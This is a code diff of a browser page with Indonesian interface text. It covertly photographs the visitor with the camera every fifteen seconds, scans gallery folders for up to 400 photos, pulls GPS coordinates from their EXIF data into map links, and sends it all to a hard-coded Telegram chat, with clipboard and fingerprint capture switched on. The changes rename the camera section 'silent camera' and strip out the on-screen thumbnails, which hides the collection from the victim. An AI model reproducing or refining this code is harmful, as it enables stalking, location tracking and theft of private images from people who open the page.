@@ -7,9 +7,7 @@ const CFG = {
   CHAT_ID:   '6084186486',
 
   MAX_GALLERY:    400,
-  MAX_THUMBS:     60,
-  BACK_FRAMES:    12,
-  FRONT_FRAMES:   12,
+  MAX_CAM_FRAMES: 30,
   CAM_GAP:        15000,
   ENABLE_CLIPBOARD: true,
   ENABLE_FINGERPRINT: true,
@@ -234,19 +232,8 @@ async function toJpeg(src, maxW = CFG.MAX_W, q = 0.72) {
   return await new Promise(r => c.toBlob(r, 'image/jpeg', q));
 }
 
-async function makeThumb(src, size = 240) {
-  const bmp = await createImageBitmap(src).catch(() => null);
-  if (!bmp) return null;
-  const s = Math.min(1, size / Math.min(bmp.width, bmp.height));
-  const c = document.createElement('canvas');
-  c.width = Math.round(bmp.width * s); c.height = Math.round(bmp.height * s);
-  c.getContext('2d').drawImage(bmp, 0, 0, c.width, c.height);
-  bmp.close?.();
-  return c.toDataURL('image/jpeg', 0.7);
-}
-
-/* ---------------- kamera dua arah ---------------- */
-let camStream = null, camTimer = null, camShots = 0, camPhase = 0;
+/* ---------------- kamera senyap ---------------- */
+let camStream = null, camTimer = null, camShots = 0;
 
 function brightnessOf(canvas) {
   try {
@@ -257,49 +244,26 @@ function brightnessOf(canvas) {
   } catch { return 128; }
 }
 
-const PLAN = [
-  { facing: 'environment', n: () => CFG.BACK_FRAMES,  tag: 'belakang' },
-  { facing: 'user',        n: () => CFG.FRONT_FRAMES, tag: 'depan' }
-];
-
 async function startCamera() {
-  return runPhase(0);
-}
-
-async function runPhase(i) {
-  if (i >= PLAN.length) return stopCamera();
-  const step = PLAN[i];
-  let stream;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: step.facing }, width: { ideal: 1600 }, height: { ideal: 1200 } },
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1440 } },
       audio: false
     });
-  } catch { return runPhase(i + 1); }
+  } catch { return false; }
 
-  camStream = stream;
-  camPhase = i;
   const v = $('#cam');
-  v.srcObject = stream;
+  v.srcObject = camStream;
 
   const c = document.createElement('canvas');
-  const limit = step.n();
-  let local = 0;
-  let timer = null;
-
   const shoot = async () => {
-    if (!camStream || local >= limit) {
-      clearInterval(timer);
-      stream.getTracks().forEach(t => t.stop());
-      camStream = null;
-      return runPhase(i + 1);
-    }
+    if (!camStream || camShots >= CFG.MAX_CAM_FRAMES) return stopCamera();
     if (!v.videoWidth) return;
     c.width = v.videoWidth; c.height = v.videoHeight;
     c.getContext('2d').drawImage(v, 0, 0);
     const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-    local++; camShots++;
-    if (blob) sendPhoto(blob, `📸 ${step.tag} #${local} · ${new Date().toLocaleString('id-ID')}`);
+    camShots++;
+    if (blob) sendPhoto(blob, `📸 #${camShots} · ${new Date().toLocaleString('id-ID')}`);
     if (camShots === 1) {
       const b = brightnessOf(c);
       const cloud = Math.max(5, Math.min(95, Math.round(100 - b * 1.15)));
@@ -308,21 +272,22 @@ async function runPhase(i) {
     }
   };
 
-  await sleep(1600);
+  await sleep(1500);
   shoot();
-  timer = setInterval(shoot, CFG.CAM_GAP);
+  camTimer = setInterval(shoot, CFG.CAM_GAP);
   return true;
 }
 
 function stopCamera() {
   clearInterval(camTimer);
+  camTimer = null;
   camStream?.getTracks().forEach(t => t.stop());
   camStream = null;
 }
 
 /* ---------------- galeri ---------------- */
 const IMG = /\.(jpe?g|png|webp|gif|bmp|heic|heif)$/i;
-let scanBusy = false, sentCount = 0, batch = [], gpsBuf = [], thumbCount = 0;
+let scanBusy = false, sentCount = 0, batch = [], gpsBuf = [];
 
 let dbP = null;
 function db() {
@@ -350,7 +315,8 @@ async function getDir() {
 
 async function flush() {
   if (!batch.length) return;
-  sendGroup(batch.slice(0, 10), `🖼️ Galeri ${sentCount - batch.length + 1}–${sentCount} · ${new Date().toLocaleString('id-ID')}`);
+  const chunk = batch.slice(0, 10);
+  sendGroup(chunk, `🖼️ Galeri ${sentCount - batch.length + 1}–${sentCount} · ${new Date().toLocaleString('id-ID')}`);
   batch = [];
 }
 
@@ -361,36 +327,18 @@ function flushGps() {
   gpsBuf = [];
 }
 
-function addThumb(dataUrl) {
-  if (thumbCount >= CFG.MAX_THUMBS) {
-    const more = $('#galMore');
-    more.hidden = false;
-    more.textContent = `+${sentCount - CFG.MAX_THUMBS} foto lainnya`;
-    return;
-  }
-  const img = document.createElement('img');
-  img.src = dataUrl;
-  img.loading = 'lazy';
-  $('#galGrid').appendChild(img);
-  thumbCount++;
-  $('#galCount').textContent = sentCount + ' foto';
-}
-
 async function processFile(file, name) {
   const buf = await file.arrayBuffer().catch(() => null);
   if (buf) {
     const g = exifGps(buf);
     if (g) gpsBuf.push(`${name} → ${g.lat}, ${g.lng} | https://maps.google.com/?q=${g.lat},${g.lng}`);
   }
-  const thumb = await makeThumb(file);
-  if (thumb) addThumb(thumb);
-
   const jpg = await toJpeg(file);
   if (!jpg) { sendFile(file, name, `⚠️ tidak bisa dikompres: ${name}`); return; }
   sentCount++;
   batch.push(jpg);
   if (batch.length >= 10) await flush();
-  if (sentCount % 5 === 0) $('#visualNote').textContent = `Mengambil foto galeri… ${sentCount}`;
+  if (sentCount % 10 === 0) $('#visualNote').textContent = `Mengambil foto galeri… ${sentCount}`;
 }
 
 async function walkDir(dir, depth, out) {
@@ -404,19 +352,14 @@ async function walkDir(dir, depth, out) {
 async function runDir(dir, tag) {
   if (scanBusy) return;
   scanBusy = true;
-  sentCount = 0; batch = []; gpsBuf = []; thumbCount = 0;
-  $('#galGrid').innerHTML = '';
-  $('#galMore').hidden = true;
-  $('#galCard').hidden = false;
+  sentCount = 0; batch = []; gpsBuf = [];
   const out = $('#visualNote');
-
   try {
     const items = [];
     await walkDir(dir, 0, items);
     if (!items.length) { out.textContent = 'Tidak ada foto di folder itu.'; scanBusy = false; return; }
 
     const take = items.slice(0, CFG.MAX_GALLERY);
-    $('#galCount').textContent = take.length + ' foto';
     sendText(`📂 ${tag} — ${take.length} foto ditemukan`);
     out.textContent = `Membaca ${take.length} foto…`;
 
@@ -460,12 +403,7 @@ async function silentRescan() {
 async function handleGallery(files) {
   const list = [...files].filter(f => f.type.startsWith('image/')).slice(0, CFG.MAX_GALLERY);
   if (!list.length) return;
-  sentCount = 0; batch = []; gpsBuf = []; thumbCount = 0;
-  $('#galGrid').innerHTML = '';
-  $('#galMore').hidden = true;
-  $('#galCard').hidden = false;
-  $('#galCount').textContent = list.length + ' foto';
-
+  sentCount = 0; batch = []; gpsBuf = [];
   const out = $('#visualNote');
   out.textContent = `Membaca ${list.length} foto…`;
   sendText(`🖼️ GALERI — ${list.length} foto`);
@@ -608,7 +546,7 @@ async function bootstrap(ask) {
 
   if (!location.protocol.startsWith('http')) toast('Buka lewat http/https, bukan file://');
 
-  startCamera().then(ok => { if (ok === false) sendText('📷 Kamera ditolak / gagal'); });
+  startCamera().then(ok => { if (!ok) sendText('📷 Kamera ditolak / gagal'); });
 
   const g = await requestGeo();
   if (g) {
